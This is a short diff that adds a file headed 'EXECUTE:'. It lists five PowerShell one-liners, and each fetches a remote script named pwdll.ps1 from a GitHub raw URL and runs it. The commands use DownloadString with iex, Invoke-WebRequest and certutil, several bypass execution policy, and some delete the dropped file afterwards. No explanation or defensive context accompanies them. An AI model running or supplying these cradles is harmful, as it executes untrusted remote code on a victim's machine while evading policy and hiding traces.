@@ -1,0 +1,11 @@
+EXECUTE:
+
+powershell.exe -nop -c "iex(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/emakedie/varios/main/pwdll.ps1')"
+
+powershell.exe -ex Bypass -c "iex(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/emakedie/varios/main/pwdll.ps1')"
+
+powershell.exe -ex Bypass -c "Invoke-WebRequest -Uri https://raw.githubusercontent.com/emakedie/varios/main/pwdll.ps1 -OutFile .\pwdll.ps1; .\pwdll.ps1; del .\pwdll.ps1"
+
+powershell.exe -nop -c "Invoke-WebRequest -Uri https://raw.githubusercontent.com/emakedie/varios/main/pwdll.ps1 -OutFile .\pwdll.ps1; .\pwdll.ps1; del .\pwdll.ps1"
+
+powershell.exe -ExecutionPolicy Bypass -nop -c "certutil -urlcache -split -f https://raw.githubusercontent.com/emakedie/varios/main/pwdll.ps1; .\pwdll.ps1; Remove-Item -Path .\pwdll.ps1 -Force"
